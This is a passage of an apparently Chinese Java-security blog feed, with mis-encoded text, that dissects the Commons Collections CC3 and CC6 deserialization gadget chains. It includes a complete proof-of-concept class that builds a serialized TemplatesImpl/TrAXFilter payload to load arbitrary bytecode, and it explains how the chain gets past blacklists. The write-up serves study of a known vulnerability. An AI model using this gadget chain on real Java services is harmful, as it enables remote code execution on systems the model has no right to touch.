class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p><code>_tfactory</code>è¿™ä¸ªå‚æ•°ä¼šåœ¨<code>TemplatesImpl</code>ååºåˆ—åŒ–çš„æ—¶å€™è‡ªè¡Œèµ‹å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241731257.png" alt="image-20260124173107692"></p><p>æ­¤æ–¹æ³•ä¾æ—§ä¸º<code>private</code>ï¼Œäºæ˜¯æ‰¾åˆ°äº†å…¬å¼€çš„<code>newTransformer</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241743037.png" alt="image-20260124173716487"></p><p>è¿™é‡Œå°±æ˜¯æœ€ç»ˆçš„å‡ºå£ç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨æ„é€ å¥½çš„<code>TemplatesImpl</code>ç±»ä¸‹çš„<code>newTransformer</code>æ–¹æ³•ï¼Œå³å¯æˆåŠŸå®ç°é“¾è·¯é€»è¾‘ï¼ŒåŠ è½½æ¶æ„å¤–éƒ¨ç±»</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„<code>defineTransletClasses</code>æ–¹æ³•åœ¨åŠ è½½å®Œç±»åï¼Œä¼šåˆ¤æ–­ï¼Œä»è€Œå½±å“ä¸‹ä¸€æ­¥<code>getTransletInstance</code>çš„ç±»çš„å®ä¾‹åŒ–</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241743751.png" alt="image-20260124174304831"></p><p><strong>æ‰€ä»¥ä¸ºäº†ä¿è¯é€»è¾‘ä¸å‡ºé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨æ„é€ æ¶æ„ç±»æ—¶éœ€è¦ç»§æ‰¿ä¸å¸¸é‡ç±»ï¼Œå¹¶ä¸”å®ç°éœ€è¦çš„æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTranslet</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br></pre></td></tr></table></figure><p>å°è¯•æ‰“é€šï¼Œåé¢å…·ä½“çš„è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬æš‚æ—¶ç”¨<code>CC6</code>çš„<code>TiedMapEntry</code>å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\å°å·\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//åå°„ä¿®æ”¹å†…éƒ¨å±æ€§</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj);</span><br><span class="line">Transformer[] chuan = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constantTransformer, invokerTransformer&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan);</span><br><span class="line">Transformer[] chuan0000 = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan0000));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">obj2.put(tiedMapEntry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">map.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-InstantiateTransformer-transform"><a href="#3-InstantiateTransformer-transform" class="headerlink" title="3.InstantiateTransformer#transform"></a>3.<code>InstantiateTransformer#transform</code></h3><p>å‰é¢æˆ‘ä»¬å·²ç»æ‰“é€šäº†ä¸€éƒ¨åˆ†ï¼Œæ›¿æ¢æ‰äº† <code>Runtime</code> çš„ <code>exec</code>ï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬æ—¶ç”¨æ¥æ›¿æ¢ <code>InvokerTransformer</code> ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241801353.png" alt="image-20260124180116215"></p><p><strong>æ‰¾åˆ° TrAXFilter ç±»çš„æ„é€ æ–¹æ³•è°ƒç”¨äº†ä¸Šä¸€æ­¥çš„ newTransformer æ–¹æ³•</strong></p><p>æˆ‘ä»¬ç»§ç»­å¾€ä¸Šï¼Œåˆæ‰¾åˆ° <code>InstantiateTransformer</code>ç±»çš„<code>transform</code>æ–¹æ³•ä¼šè°ƒç”¨è¾“å‡ºç±»å‚æ•°çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241804054.png" alt="image-20260124180439980"></p><p><strong>è¿›è¡Œæ„é€ </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>å‚æ•° obj ä¸ºæˆ‘ä»¬ä¹‹å‰æ„é€ çš„ <code>TemplatesImpl</code> ç±»</p><p><strong>è‡ªæ­¤ï¼Œé“¾æ¡å…¨éƒ¨æ‰“é€š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241811274.png" alt="image-20260124180727848"></p><h2 id="äºŒã€é“¾è·¯å›é¡¾"><a href="#äºŒã€é“¾è·¯å›é¡¾" class="headerlink" title="äºŒã€é“¾è·¯å›é¡¾"></a>äºŒã€é“¾è·¯å›é¡¾</h2><h3 id="1-æœ€ç»ˆ-poc"><a href="#1-æœ€ç»ˆ-poc" class="headerlink" title="1.æœ€ç»ˆ poc"></a>1.æœ€ç»ˆ poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">chuan</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\å°å·\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹å†…éƒ¨å±æ€§</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] chuan = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constantTransformer, instantiateTransformer&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan);</span><br><span class="line">        Transformer[] chuan0000 = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan0000));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        obj2.put(tiedMapEntry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(lazyMap, chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        serialize(obj2);</span><br><span class="line">        unserialize();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String bytecodes, Object bytes)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(bytecodes);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chuan.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;chuan.txt&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-é“¾è·¯"><a href="#2-é“¾è·¯" class="headerlink" title="2.é“¾è·¯"></a>2.é“¾è·¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CC6é“¾è·¯</span><br><span class="line">    -&gt;InstantiateTransformer#transform          è¿™é‡Œï¼Œæˆ‘ä»¬è¿å…¥äº†CCé“¾</span><br><span class="line">    -&gt;TrAXFilter#TrAXFilter</span><br><span class="line">    -&gt;TemplatesImpl#newTransformer</span><br><span class="line">    -&gt;TemplatesImpl#getTransletInstance</span><br><span class="line">    -&gt;TemplatesImpl#defineTransletClasses -&gt;TemplatesImpl#newInstance</span><br><span class="line">    -&gt;TemplatesImpl#defineClass</span><br><span class="line">    -&gt;å®ç°åŠ è½½æ¶æ„ç±»</span><br></pre></td></tr></table></figure><h3 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3.æ€»ç»“"></a>3.æ€»ç»“</h3><p><code>CC3</code>é“¾éå¸¸å·§å¦™çš„ç»•è¿‡äº†é»‘åå•ä¸­ <code>InvokeTransformer</code> ä¸ <code>Runtime</code> é™åˆ¶,<strong>åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </strong>çš„æ‰‹æ®µ</p><p>è¿™ä¸ª<code>CC3</code>çš„å‘æ˜å¾ˆæœ‰æ¥å¤´ï¼Œ2015å¹´åˆï¼Œ@frohoffå’Œ@geblå‘å¸ƒäº†Talkã€ŠMarshalling Pickles: how deserializing objects will ruin your </p><p>dayã€‹ï¼Œä»¥åŠJavaååºåˆ—åŒ–åˆ©â½¤â¼¯å…·ysoserialï¼Œéšåå¼•çˆ†äº†å®‰å…¨ç•Œã€‚å¼€å‘è€…ä»¬â¾ƒç„¶ä¼šå»æ‰¾å¯»â¼€ç§å®‰å…¨çš„è¿‡æ»¤â½…æ³•ï¼Œäºæ˜¯å°è¯•è¿‡æ»¤ä¸€äº› CC </p><p>çš„ä¸»è¦å…³é”®å­—ï¼Œå¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601242150889.png" alt="image-20260124215007747"></p><p><code>CommonsCollections3</code> çš„â½¬çš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä¸ºäº†ç»•è¿‡ <code>InvokerTransformer</code> çš„é™åˆ¶ï¼Œä½¿ç”¨äº†<code>com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java</code>æ¥ç»•è¿‡ï¼Œ</p><p><strong>å½“ç„¶ï¼Œè¿™ä¸ªé“¾è¿˜æ˜¯å—åˆ°ï¼Œjdk ç‰ˆæœ¬ä»¥åŠcommon collections ç‰ˆæœ¬å½±å“</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252049453.png" alt="image-20260125204949270"></p>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-CC6</title>
      <link href="/2026/01/15/CC6-chain/"/>
      <url>/2026/01/15/CC6-chain/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC6"><a href="#Javaå®‰å…¨-CC6" class="headerlink" title="Javaå®‰å…¨-CC6"></a>Javaå®‰å…¨-CC6</h1><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jdk1.8u71</span><br><span class="line">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</span><br><span class="line"></span><br><span class="line">openjdk8u71_b15</span><br><span class="line">https://github.com/openjdk/jdk8u/releases/tag/jdk8u71-b15</span><br><span class="line">å°†sunå¯¼å…¥orcale</span><br><span class="line"></span><br><span class="line">Comoons-Collections 3.2.1ä¾æ—§</span><br></pre></td></tr></table></figure><h3 id="å±é™©ç±»è°ƒç”¨ç‚¹"><a href="#å±é™©ç±»è°ƒç”¨ç‚¹" class="headerlink" title="å±é™©ç±»è°ƒç”¨ç‚¹"></a>å±é™©ç±»è°ƒç”¨ç‚¹</h3><ul><li><p>è¿™é‡Œä¾æ—§æ˜¯ <strong>CC1</strong> çš„å±é™©ç‚¹</p><p>ä¾æ—§æ˜¯è°ƒç”¨<code>ChainedTransformer</code>çš„<code>Transformer</code>æ–¹æ³•è¿›è€Œæ‰§è¡Œ <code>Runtime.exec</code>æ–¹æ³•</p></li></ul><p><strong>è¿™é‡Œï¼Œæˆ‘ä»¬ä»å±é™©åˆ©ç”¨ç‚¹åˆ†æ</strong></p><h2 id="ä¸€ã€ä¸»è¦é€»è¾‘"><a href="#ä¸€ã€ä¸»è¦é€»è¾‘" class="headerlink" title="ä¸€ã€ä¸»è¦é€»è¾‘"></a>ä¸€ã€ä¸»è¦é€»è¾‘</h2><h3 id="1-LazyMap-get"><a href="#1-LazyMap-get" class="headerlink" title="1.LazyMap#get"></a>1.<code>LazyMap#get</code></h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601122236075.png" alt="image-20260112223559960"></p><p><strong>è¿™é‡Œä¾æ—§ç”¨çš„CC1çš„ transform æ–¹æ³•</strong></p><p><strong>æ ¹æ®é€»è¾‘ï¼Œæˆ‘ä»¬å‹˜æµ‹åˆ°åªæœ‰å½“ map é›†åˆä¸­ä¸åŒ…å« key æ—¶ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨ transform æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chuanTransformer);</span><br></pre></td></tr></table></figure><h3 id="2-TiedMapEntry-hashCode"><a href="#2-TiedMapEntry-hashCode" class="headerlink" title="2.TiedMapEntry#hashCode"></a>2.<code>TiedMapEntry#hashCode</code></h3><p><strong>æˆ‘ä»¬ä¸ºäº†è°ƒç”¨ä¸Šä¸€ä¸ªæä¾›çš„ get æ–¹æ³•ï¼Œæ‰¾åˆ°äº†è¿™é‡Œ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601122240715.png" alt="image-20260112224023528"></p><p><strong>å½“è°ƒç”¨ hashCode æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„ getValue æ–¹æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601122241327.png" alt="image-20260112224127254"></p><p><strong>è€Œè¿™ä¸ª getValue æ–¹æ³•ï¼Œä¼šè°ƒç”¨ map é›†åˆçš„ get æ–¹æ³•</strong></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥å°† <strong>map</strong> èµ‹å€¼ä¸º <strong>LazyMap</strong> ç±»ï¼Œ<strong>è¿›è€Œè°ƒç”¨å…¶çš„ get æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-HashMap-readObject"><a href="#3-HashMap-readObject" class="headerlink" title="3.HashMap#readObject"></a>3.<code>HashMap#readObject</code></h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601122246726.png" alt="image-20260112224629633"></p><p><strong>è¿™é‡ŒåŒæ—¶ä¹Ÿæ˜¯ååºåˆ—åŒ–æ¼æ´å…¥å£ç‚¹</strong></p><p><strong>æˆ‘ä»¬åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–å¯¹è±¡çš„ readObject æ–¹æ³•ï¼Œè¿™é‡Œè¿›è€Œä¼šè°ƒç”¨ hash æ–¹æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601122248468.png" alt="image-20260112224802362"></p><p><strong>è€Œ hash æ–¹æ³•ä¼šè°ƒç”¨ä¼ å…¥å€¼ key çš„hashCode æ–¹æ³•</strong></p><p><strong>æˆ‘ä»¬ç»™ä¸€ä¸ª key èµ‹å€¼ä¸ºæ¶æ„ç±» TiedMapEntry ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">obj2.put(foo, <span class="string">&quot;bar&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="äºŒã€é¢å¤–"><a href="#äºŒã€é¢å¤–" class="headerlink" title="äºŒã€é¢å¤–"></a>äºŒã€é¢å¤–</h2><h3 id="1-obj2-put-foo-bar"><a href="#1-obj2-put-foo-bar" class="headerlink" title="1.obj2.put(foo, &quot;bar&quot;);"></a>1.<code>obj2.put(foo, &quot;bar&quot;);</code></h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601131740119.png" alt="image-20260113174016801"></p><p>è¿è¡Œè¿™ä¸ªæ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨ hash æ–¹æ³•ï¼Œä»è€Œä¼šè°ƒç”¨æˆ‘ä»¬çš„æ¶æ„é“¾ï¼Œæ‰§è¡Œå‘½ä»¤</p><p>æ‰€ä»¥ä¸ºäº†åœ¨ååºåˆ—åŒ–ä¹‹å‰ä¸è°ƒç”¨æ¶æ„é“¾ï¼Œæˆ‘ä»¬å…ˆ put ä¸€ä¸ª<strong>æ­£å¸¸æ— å®³é“¾</strong>ï¼Œæœ€åé€šè¿‡<strong>åå°„</strong>ä¿®æ”¹ä¸ºæ¶æ„é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] chuan0000 = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chuanTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan0000);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chuanTransformer, chuan);</span><br></pre></td></tr></table></figure><h3 id="2-LazyMap-get"><a href="#2-LazyMap-get" class="headerlink" title="2.LazyMap#get"></a>2.<code>LazyMap#get</code></h3><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601131746609.png" alt="image-20260113174641473"></p><p>ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ get æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬åœ¨å½“åˆ<strong>åˆ›å»º map ç±»æ—¶ï¼Œæ­¤ key ä¸ value å·²ç»è¢«åŠ å…¥åˆ° map ä¸­</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601131804442.png" alt="image-20260113180450303"></p><p><strong>è¿™æ ·åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¾¿ä¸ä¼šæ‰§è¡Œ lazyMap çš„ put ä¸­çš„é€»è¾‘ï¼Œå› ä¸ºå·²ç»åŒ…å«</strong></p><p><strong>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ é™¤ï¼Œä»¥ä¾¿é€»è¾‘æ­£å¸¸</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-è°ƒè¯•çš„å‘"><a href="#3-è°ƒè¯•çš„å‘" class="headerlink" title="3.è°ƒè¯•çš„å‘"></a>3.è°ƒè¯•çš„å‘</h3><p>åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œåªæœ‰ä¸€å‡ºç°æ–­ç‚¹å°±ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ IDEA è¿›è¡Œ debug è°ƒè¯•çš„æ—¶å€™ï¼Œä¸ºäº†å±•ç¤ºå¯¹è±¡çš„é›†åˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code> 